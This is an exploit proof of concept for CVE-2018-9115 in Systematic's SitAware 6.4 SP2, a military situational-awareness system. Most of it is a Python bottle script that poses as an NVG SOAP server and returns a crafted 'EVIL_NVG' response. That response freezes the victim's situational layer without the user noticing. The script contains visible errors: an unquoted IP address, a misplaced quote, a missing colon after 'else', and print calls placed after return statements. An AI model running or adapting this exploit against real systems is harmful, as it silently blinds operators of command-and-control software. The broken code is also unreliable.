# Date: 03/31/2018
# Exploit Author: 2u53
# Vendor Homepage: https://systematic.com/defence/products/c2/sitaware/
# Version: 6.4 SP2
# Tested on: Windows Server 2012 R2
# CVE: CVE-2018-9115
 
# Remarks: PoC needs bottlypy:
# https://bottlepy.org/docs/dev/
# https://raw.githubusercontent.com/bootlepy/bottle/master/bottle.py
 
# Systematic&#039;s SitAware does not validate input from other sources suffenciently. Incoming information utilizing 
# the for example the NVG interface. The following PoC will freeze the Situational Layer of SitAware, which means
# that the Situational Picture is no more updated. Unfortunately the user can not notice until 
# he tries to work with the situational layer. 
 
 
#!/bin/python
 
from bottle import post, run, request, response
 
LHOST = 127.0.0.1 # Local IP which the NVG server should use
LPORT = 8080 # Local Port on which the NVG server should listen
 
GET_CAPABILITIES = &#039;&#039;&#039;<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<ns3:GetCapabilitiesResponse xmlns="http://purl.org/dc/elements/1.1/" xmlns:ns2="http://purl.org/dc/terms/" xmlns:ns3="http://tide.act.nato.int/schemas/2008/10/nvg" xmlns:ns4="http://tide.act.nato.int/wsdl/2009/nvg">
<ns4:nvg_capabilities version="1.5">
</ns4:nvg_capabilities>
</ns3:GetCapabilitiesResponse>
</soap:Body>
</soap:Envelope>&#039;&#039;&#039;
 
EVIL_NVG = &#039;&#039;&#039;<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> <soap:Body>
<ns3:GetNvgResponse xmlns="http://purl.org/dc/elements/1.1/" xmlns:ns2="http://purl.org/dc/terms/" xmlns:ns3="http://tide.act.nato.int/schemas/2008/10/nvg" xmlns:ns4="http://tide.act.nato.int/wsdl/2009/nvg">
<ns4:nvg version="1.5" classification="NATO UNCLASSIFIED">
<ns4:multipoint points="-0.01,0.01 0.02,-0.02 0.01,0.01" symbol="2525b:GFTPZ---------X"
label="EVILOBJ"/>
</ns4:nvg>
</ns3:GetNvgResponse>
</soap:Body>
</soap:Envelope>&#039;&#039;&#039;
 
@post(&#039;/nvg&#039;)
def soap():
    action = dict(request.headers.items()).get(&#039;Soapaction&#039;)
    action = action.replace(&#039;"&#039;, &#039;&#039;)
    print(&#039;Incoming connection&#039;)
 
    response.content_type = &#039;text/xml;charset=utf-8&#039;
 
    if action.endswith(&#039;nvg/GetCapabilities&#039;):
        print(&#039;Sending capabilities to victim&#039;...)
        return GET_CAPABILITIES
        print(&#039;Done! Waiting for NVG request...&#039;)
    elif action.endswith(&#039;nvg/GetNvg&#039;):
        print(&#039;Sending evil NVG&#039;)
        return EVIL_NVG
        print(&#039;Done!&#039;)
    else
        print(&#039;Invalid request received&#039;)
 
run(host=LHOST, port=LPORT)

